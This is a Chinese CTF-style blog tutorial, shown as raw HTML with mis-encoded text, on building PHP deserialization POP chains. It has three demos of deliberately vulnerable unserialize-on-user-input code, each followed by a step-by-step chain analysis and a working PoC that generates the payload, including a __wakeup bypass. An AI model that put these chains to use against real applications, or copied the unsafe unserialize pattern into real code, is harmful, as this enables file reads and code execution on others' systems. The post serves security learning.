<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>PHPååºåˆ—åŒ–ä¹‹POPé“¾æ„é€ ğŸ›´ | ch1eçš„è‡ªç•™åœ°</title>
<link rel="shortcut icon" href="https://ch0x01e.github.io/favicon.ico?v=1709471671274">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://ch0x01e.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="PHPååºåˆ—åŒ–ä¹‹POPé“¾æ„é€ ğŸ›´ | ch1eçš„è‡ªç•™åœ° - Atom Feed" href="https://ch0x01e.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="PHPååºåˆ—åŒ–ä¹‹popé“¾
POPé“¾ä»‹ç»
POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programing..." />
    <meta name="keywords" content="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://ch0x01e.github.io">
  <img class="avatar" src="https://ch0x01e.github.io/images/avatar.png?v=1709471671274" alt="">
  </a>
  <h1 class="site-title">
    ch1eçš„è‡ªç•™åœ°
  </h1>
  <p class="site-description">
    Manners maketh man
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
      
        <a href="https://ch1e.cn/post/friends" class="menu">
          å‹é“¾
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              PHPååºåˆ—åŒ–ä¹‹POPé“¾æ„é€ ğŸ›´
            </h2>
            <div class="post-info">
              <span>
                2022-10-16
              </span>
              <span>
                10 min read
              </span>
              
            </div>
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="phpååºåˆ—åŒ–ä¹‹popé“¾">PHPååºåˆ—åŒ–ä¹‹popé“¾</h1>
<h2 id="popé“¾ä»‹ç»">POPé“¾ä»‹ç»</h2>
<p>POP é¢å‘å±æ€§ç¼–ç¨‹(Property-Oriented Programing) å¸¸ç”¨äºä¸Šå±‚è¯­è¨€æ„é€ ç‰¹å®šè°ƒç”¨é“¾çš„æ–¹æ³•ï¼Œä¸äºŒè¿›åˆ¶åˆ©ç”¨ä¸­çš„é¢å‘è¿”å›ç¼–ç¨‹ï¼ˆReturn-Oriented Programingï¼‰çš„åŸç†ç›¸ä¼¼ï¼Œéƒ½æ˜¯ä»ç°æœ‰è¿è¡Œç¯å¢ƒä¸­å¯»æ‰¾ä¸€ç³»åˆ—çš„ä»£ç æˆ–è€…æŒ‡ä»¤è°ƒç”¨ï¼Œç„¶åæ ¹æ®éœ€æ±‚æ„æˆä¸€ç»„è¿ç»­çš„è°ƒç”¨é“¾,æœ€ç»ˆè¾¾åˆ°æ”»å‡»è€…é‚ªæ¶çš„ç›®çš„</p>
<p>è¯´çš„å†å…·ä½“ä¸€ç‚¹å°±æ˜¯ ROP æ˜¯é€šè¿‡æ ˆæº¢å‡ºå®ç°æ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæµç¨‹ï¼Œè€Œæˆ‘ä»¬çš„ååºåˆ—åŒ–æ˜¯é€šè¿‡æ§åˆ¶å¯¹è±¡çš„å±æ€§ä»è€Œå®ç°æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œè¿›è€Œè¾¾æˆåˆ©ç”¨æœ¬èº«æ— å®³çš„ä»£ç è¿›è¡Œæœ‰å®³æ“ä½œçš„ç›®çš„ã€‚</p>
<h2 id="é­”æœ¯æ–¹æ³•ä»‹ç»">é­”æœ¯æ–¹æ³•ä»‹ç»</h2>
<figure data-type="image" tabindex="1"><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220411174228630.png" alt="image-20220411174228630" loading="lazy"></figure>
<h3 id="ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹">ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹</h3>
<ul>
<li><code>__wakeup</code> ä¸€å®šä¼šè°ƒç”¨</li>
<li><code>__destruct</code> ä¸€å®šä¼šè°ƒç”¨</li>
<li><code>__toString</code> å½“ä¸€ä¸ªå¯¹è±¡è¢«ååºåˆ—åŒ–ååˆè¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨</li>
</ul>
<h3 id="ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿">ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿</h3>
<ul>
<li><code>__toString</code> å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²ä½¿ç”¨</li>
<li><code>__get</code> è¯»å–ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§æ—¶è¢«è°ƒç”¨</li>
<li><code>__set</code> å½“ç»™ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨å±æ€§èµ‹å€¼æ—¶è¢«è°ƒç”¨</li>
<li><code>__isset</code> å¯¹ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è¢«è°ƒç”¨ã€‚å½¢å¦‚ <code>$this-&gt;$func();</code></li>
</ul>
<h3 id="ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹">ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹</h3>
<ul>
<li><code>__call</code> è°ƒç”¨ä¸å¯è®¿é—®æˆ–ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶è¢«è°ƒç”¨</li>
<li><code>call_user_func</code> ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ</li>
<li><code>call_user_func_array</code> ä¸€èˆ¬phpä»£ç æ‰§è¡Œéƒ½ä¼šé€‰æ‹©è¿™é‡Œ</li>
</ul>
<h2 id="demo1">DEMO1</h2>
<pre><code class="language-php">&lt;?php
//flag is in flag.php
error_reporting(0);
class Read {
    public $var;
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
    public function __invoke(){
        $content = $this-&gt;file_get($this-&gt;var);
        echo $content;
    }
}
class Show
{
    public $source;
    public $str;
    public function __construct($file='index.php')
    {
        $this-&gt;source = $file;
        echo $this-&gt;source.'Welcome'.&quot;&lt;br&gt;&quot;;
    }
    public function __toString()
    {
        return $this-&gt;str['str']-&gt;source;
    }
    public function _show()
    {
        if(preg_match('/gopher|http|ftp|https|dict|\.\.|flag|file/i',$this-&gt;source)) 		 {
            die('hacker');
        } else {
            highlight_file($this-&gt;source); 
        }
    }
    public function __wakeup()
    {
        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {
            echo &quot;hacker&quot;;
            $this-&gt;source = &quot;index.php&quot;;
        }
    }
}
class Test
{
    public $p;
    public function __construct()
    {
        $this-&gt;p = array();
    }

    public function __get($key)
    {
        $function = $this-&gt;p;
        return $function();
    }
}
if(isset($_GET['hello']))
{
    unserialize($_GET['hello']);
}
else
{
    $show = new Show('pop3.php');
    $show-&gt;_show();
}
</code></pre>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥åˆ†ææ„é€ POPé“¾çš„è¿‡ç¨‹ï¼Œå…ˆçœ‹æœ€åï¼Œgetè¯·æ±‚ä¼ å…¥ä¸€ä¸ªhelloå‚æ•°ï¼Œç„¶åå¯¹ä»–è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<ol>
<li>æˆ‘ä»¬è¦å¯»æ‰¾å±é™©çš„å‡½æ•°ï¼Œæ¯”å¦‚è¿™ä¸ªDEMOä¸­åœ¨Readå¯¹è±¡ä¸­å­˜åœ¨ä¸€ä¸ªfile_get(0æ–¹æ³•ï¼Œå…¶ä¸­ç”¨äº†file_get_contentsè¯»æ–‡ä»¶ï¼Œæˆ‘ä»¬å¤§æ¦‚å°±æ‡‚äº†é¢˜ç›®åº”è¯¥æ˜¯è¦é€šè¿‡è°ƒç”¨è¿™ä¸ªæ–¹æ³•æ¥è¯»å–æˆ‘ä»¬çš„flag.phpæ–‡ä»¶ã€‚</li>
<li>ç„¶åæˆ‘ä»¬æ¥è§‚å¯Ÿæ¯ä¸ªå¯¹è±¡çš„å„ç§é­”æœ¯æ–¹æ³•ï¼Œå…¥å£å¤šä¸ºwakeup,destruct,tostringé­”æœ¯æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°Showå¯¹è±¡ä¸­å­˜åœ¨ä¸€ä¸ªtostringé­”æœ¯æ–¹æ³•å’Œä¸€ä¸ªwakeupé­”æœ¯æ–¹æ³•ï¼Œåœ¨æ‰§è¡Œunserializeå‡½æ•°çš„æ—¶å€™ä¼šå…ˆè§¦å‘wakeupæ–¹æ³•</li>
<li>wakeupé­”æœ¯æ–¹æ³•ä¸­å¯¹Showå¯¹è±¡çš„sourceå±æ€§è¿›è¡Œäº†ä¸€ä¸ªæ­£åˆ™åŒ¹é…ï¼Œå¯¹åº”çš„ç¬¬äºŒä¸ªå‚æ•°æœ¬åº”ä¸ºå­—ç¬¦ä¸²ï¼Œä½†æ˜¯è¿™é‡Œå¦‚æœsourceå±æ€§æ˜¯æŸä¸ªç±»çš„å¯¹è±¡ï¼Œå°±ä¼šè§¦å‘tostringæ–¹æ³•ï¼Œtostringä¹Ÿæ˜¯Showå¯¹è±¡ä¸­çš„é­”æœ¯æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œçš„sourceå±æ€§åº”ä¸ºä¸€ä¸ªShowç±»çš„å¯¹è±¡ã€‚</li>
<li>tostringä¸­ï¼Œè¿”å›äº†å½“å‰å¯¹è±¡çš„é”®ä¸ºstrçš„valueå€¼ç»™sourceï¼Œå¦‚æœè¿™ä¸ªvalueä¸å­˜åœ¨ï¼Œå¯èƒ½ä¼šè§¦å‘__get()é­”æœ¯æ–¹æ³•ã€‚</li>
<li>æˆ‘ä»¬æ¥ç€å¯»æ‰¾ï¼Œå‘ç°åœ¨Testç±»ä¸­å­˜åœ¨ç€__get()é­”æœ¯æ–¹æ³•ï¼ŒæŠŠå½“å‰å¯¹è±¡çš„på±æ€§èµ‹ç»™äº†functionå˜é‡ï¼Œå¹¶ä¸”ä»¥å‡½æ•°çš„å½¢å¼å»æ‰§è¡Œï¼Œæ‰€ä»¥å¦‚æœè¿™é‡Œçš„på±æ€§æ˜¯ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œå°±å¯ä»¥èƒ½è°ƒç”¨__invoke()é­”æœ¯æ–¹æ³•</li>
<li>å‘ç°Readç±»ä¸­å­˜åœ¨__invoke()é­”æœ¯æ–¹æ³•ï¼Œå…¶ä¸­è°ƒç”¨äº†æœ¬ç±»ä¸­çš„file_getå‡½æ•°ï¼Œä»¥varä½œä¸ºå½¢å‚ï¼Œæ‰€ä»¥è¿™é‡Œçš„varåº”è¯¥ä¸ºflag.php</li>
</ol>
<p>POCï¼š</p>
<pre><code class="language-php">&lt;?php
class Read {
    public $var=&quot;flag.php&quot;;
}

class Show
{
    public $source;
    public $str;
}

class Test
{
    public $p;
}
$R=new Read();
$S=new Show();
$T=new Test();
$T-&gt;p=$R;
$S-&gt;str['str']=$T;
$S-&gt;source=$S;
echo urlencode(serialize($S));
</code></pre>
<h2 id="demo2">DEMO2</h2>
<pre><code class="language-php">&lt;?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __destruct()
        {
                $this-&gt;mod1-&gt;test1();
        }
}
class Call
{
        public $mod1;
        public $mod2;
        public function test1()
    {
            $this-&gt;mod1-&gt;test2();
    }
}
class funct
{
        public $mod1;
        public $mod2;
        public function __call($test2,$arr)
        {
                $s1 = $this-&gt;mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __invoke()
        {
                $this-&gt;mod2 = &quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;.$this-&gt;mod1;
        } 
}
class string1
{
        public $str1;
        public $str2;
        public function __toString()
        {
                $this-&gt;str1-&gt;get_flag();
                return &quot;1&quot;;
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;
        }
}
$a = $_GET['string'];
unserialize($a);
?&gt;

</code></pre>
<ol>
<li>æ‹¿åˆ°ä»£ç ï¼Œå…ˆå¯»æ‰¾å±é™©å‡½æ•°ï¼Œå‘ç°åœ¨GetFlagç±»ä¸­å­˜åœ¨get_flag()å‡½æ•°ï¼Œè¾“å‡ºflagï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆæ˜¯éœ€è¦é€šè¿‡è°ƒç”¨GetFlag()ä¸­çš„get_flag()å‡½æ•°æ¥è¾“å‡ºæˆ‘ä»¬çš„flag</li>
<li>string1ç±»ä¸­çš„tostringè°ƒç”¨äº†è‡ªèº«str1å±æ€§çš„get_flag()æ–¹æ³•ï¼Œè¿™é‡Œå¯ä»¥çŸ¥é“æˆ‘ä»¬éœ€è¦æŠŠstring1çš„ç±»çš„str1å±æ€§çš„å€¼æ˜¯GetFlagç±»çš„ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”éœ€è¦è°ƒç”¨åˆ°string1ç±»çš„tostringè¿™ä¸ªæ–¹æ³•æ‰å¯ä»¥è¾“å‡ºflag</li>
<li>ç»§ç»­å¾€ä¸Šçœ‹ï¼Œfuncç±»çš„invokeé­”æœ¯æ–¹æ³•æ‹¼æ¥äº†&quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;å’Œè‡ªèº«çš„mod1å±æ€§çš„å€¼ç»™äº†è‡ªèº«çš„mod2å±æ€§ï¼Œè¿™é‡Œå¦‚æœmod1å±æ€§çš„å€¼æ˜¯string1çš„å¯¹è±¡ï¼Œä¼šè§¦å‘string1å¯¹è±¡çš„tostringæ–¹æ³•</li>
<li>å¦‚æœè¦è§¦å‘funcçš„invokeé­”æœ¯æ–¹æ³•ï¼Œæˆ‘ä»¬éœ€è¦ç”¨å‡½æ•°çš„æ–¹å¼æ¥è°ƒç”¨funcå¯¹è±¡ï¼Œè¿™é‡Œå¯ä»¥å‘ç°functä¸­callé­”æœ¯æ–¹æ³•ä¸­ä»¥å‡½æ•°çš„å½¢å¼è°ƒç”¨äº†è‡ªèº«çš„mod1å±æ€§ï¼Œå¦‚æœè¿™é‡Œçš„mod1å±æ€§æ˜¯funcçš„å¯¹è±¡ï¼Œå°±ä¼šè§¦å‘funcç±»ä¸­çš„invokeæ–¹æ³•</li>
<li>éœ€è¦è°ƒç”¨åˆ°funcç±»ä¸­çš„invokeæ–¹æ³•ï¼Œå¿…é¡»å…ˆè°ƒç”¨åˆ°functç±»ä¸­çš„callé­”æœ¯æ–¹æ³•ï¼Œcallé­”æœ¯æ–¹æ³•æ˜¯è¦è°ƒç”¨äº†ä¸å­˜åœ¨çš„æ–¹æ³•æ‰ä¼šè§¦å‘ï¼Œå¯ä»¥çœ‹åˆ°Callç±»ä¸­çš„test1æ–¹æ³•è°ƒç”¨äº†è‡ªèº«mod1å±æ€§ä¸‹çš„test2æ–¹æ³•ï¼Œè¿™é‡Œå¦‚æœmod1æ˜¯functçš„ä¸€ä¸ªå¯¹è±¡ï¼Œå°±å¯ä»¥è§¦å‘functçš„callæ–¹æ³•</li>
<li>ç„¶åæ˜¯start_ggç±»ï¼Œï¼Œdestructé­”æœ¯æ–¹æ³•è°ƒç”¨äº†è‡ªèº«mod1çš„test1æ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œåº”è¯¥æ˜¯ä¸ªå…¥å£ï¼Œæˆ‘ä»¬éœ€è¦å…ˆè®©ä»–çš„mod1ä¸ºCallç±»çš„ä¸€ä¸ªå¯¹è±¡</li>
</ol>
<p>POCï¼š</p>
<pre><code class="language-php">&lt;?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this-&gt;mod1= new Call();
        }
        public function __destruct()
        {
                $this-&gt;mod1-&gt;test1();
        }
}
class Call
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this-&gt;mod1= new funct();
        }
        public function test1()
    {
            $this-&gt;mod1-&gt;test2();
    }
}
class funct
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this-&gt;mod1= new func();
        }
        public function __call($test2,$arr)
        {
                $s1 = $this-&gt;mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this-&gt;mod1= new string1();
        }
        public function __invoke()
        {
                $this-&gt;mod2 = &quot;å­—ç¬¦ä¸²æ‹¼æ¥&quot;.$this-&gt;mod1;
        } 
}
class string1
{
        public $str1;
        public $str2;
        public function __construct()
        {
                $this-&gt;str1= new GetFlag();
        }
        public function __toString()
        {
                $this-&gt;str1-&gt;get_flag();
                return &quot;1&quot;;
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;
        }
}
$a = new start_gg();
echo urlencode(serialize($a));
?&gt;

</code></pre>
<h2 id="demo3">DEMO3</h2>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);
class A
{
  public $a;
  private $b;
  protected $c;
  public function __construct($a, $b, $c)
  {
    $this-&gt;a = $a;
    $this-&gt;b = $b;
    $this-&gt;c = $c;
  }
  protected function flag()
  {
    echo file_get_contents('/flag');
  }

  public function __call($name, $arguments)
  {
    call_user_func([$name, $arguments[0]]);
  }

  public function __destruct()
  {
    return 'this a:' . $this-&gt;a;
  }
  public function __wakeup()
  {
    $this-&gt;a = 1;
    $this-&gt;b = 2;
    $this-&gt;c = 3;
  }
}
class B
{
  public $a;
  private $b;
  protected $c;
  public function __construct($a, $b, $c)
  {
    $this-&gt;a = $a;
    $this-&gt;b = $b;
    $this-&gt;c = $c;
  }
  public function b()
  {
    echo $this-&gt;b;
  }
  public function __toString()
  {
    $this-&gt;a-&gt;a($this-&gt;b);
    return 'this is B';
  }
}
if (isset($_GET['str']))
  unserialize($_GET['str']);

</code></pre>
<ol>
<li>è¿™é¢˜æ¯”è¾ƒç®€å•ï¼Œåªæœ‰ä¸¤ä¸ªç±»ï¼Œç±»Aä¸­æœ‰è¯»å–flagæ–‡ä»¶çš„æ–¹æ³•flag()ï¼Œè¿˜æœ‰wakeupæ–¹æ³•ï¼Œèµ·ç‚¹åŸºæœ¬å°±æ˜¯ç±»A</li>
<li>è¿™é‡ŒAç±»é‡Œæœ‰wakeupé­”æœ¯æ–¹æ³•ä¼šå¯¹Aç±»ä¸‹é¢çš„å±æ€§èµ‹å€¼ï¼Œæ‰€ä»¥éœ€è¦ç»•è¿‡ï¼Œç»•è¿‡å¾ˆç®€å•ã€‚å±æ€§çš„æ•°é‡åŠ 1å³å¯ï¼Œç„¶ådestructé­”æœ¯æ–¹æ³•è¿”å›äº†&quot;this a:&quot;ä¸Aç±»ä¸‹çš„å±æ€§açš„å€¼è¿›è¡Œæ‹¼æ¥</li>
<li>å¦‚æœå±æ€§açš„å€¼ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œä¼šè§¦å‘tostringé­”æœ¯æ–¹æ³•ï¼Œåˆšå¥½Bç±»ä¸­æœ‰è¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼Œå¹¶ä¸”è°ƒç”¨äº†Bç±»ä¸­çš„å±æ€§Açš„aæ–¹æ³•ï¼Œå¦‚æœæœ‰callé­”æœ¯æ–¹æ³•ä¼šè¿›è¡Œè°ƒç”¨ï¼Œæ°å¥½Aç±»ä¸­æœ‰callé­”æœ¯æ–¹æ³•ã€‚</li>
<li>callè¿”å›äº†call_user_func()å‡½æ•°ï¼Œè¿™é‡Œæˆ‘çœ‹äº†åŠå¤©æ²¡çœ‹æ˜ç™½ï¼Œæœ€åçš„åœ¨åˆ«çš„å¸ˆå‚…çš„æŒ‡å¯¼ä¸‹æˆ‘çœ‹æ˜ç™½äº†ï¼Œ[<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">name,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mpunct">,</span></span></span></span>arguments[0]]å°±æ˜¯<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">name.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord">.</span></span></span></span>arguments[0]ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¦‚æœè¦è°ƒç”¨è¿™ä¸ªflag,éœ€è¦name==Aï¼Œ$arguments[0]==flag.æ„é€ pocå³å¯</li>
</ol>
<p>POCï¼š</p>
<pre><code class="language-php">&lt;?php

class A

{

  public $a;

  private $b;

  protected $c; 

}

class B

{

  public $a;

  private $b;

  protected $c;

  public function __construct()

  {

    $this-&gt;b='flag';

  }

}

$t=new A();

$s=new B();

$s-&gt;a=$t;

$t-&gt;a=$s;

$p=serialize($t);

$p=str_replace('A&quot;:3','A&quot;:4',$p);

echo $p;

echo '&lt;/br&gt;';

echo urlencode($p);
</code></pre>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bpop%E9%93%BE">PHPååºåˆ—åŒ–ä¹‹popé“¾</a>
<ul>
<li><a href="#pop%E9%93%BE%E4%BB%8B%E7%BB%8D">POPé“¾ä»‹ç»</a></li>
<li><a href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E4%BB%8B%E7%BB%8D">é­”æœ¯æ–¹æ³•ä»‹ç»</a>
<ul>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E8%B5%B7%E7%82%B9">ååºåˆ—åŒ–çš„å¸¸è§èµ·ç‚¹</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E4%B8%AD%E9%97%B4%E8%B7%B3%E6%9D%BF">ååºåˆ—åŒ–çš„å¸¸è§ä¸­é—´è·³æ¿</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%B8%B8%E8%A7%81%E7%BB%88%E7%82%B9">ååºåˆ—åŒ–çš„å¸¸è§ç»ˆç‚¹</a></li>
</ul>
</li>
<li><a href="#demo1">DEMO1</a></li>
<li><a href="#demo2">DEMO2</a></li>
<li><a href="#demo3">DEMO3</a></li>
</ul>
</li>
</ul>

              </div>
            </div>
          </article>
        </div>

        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://ch0x01e.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
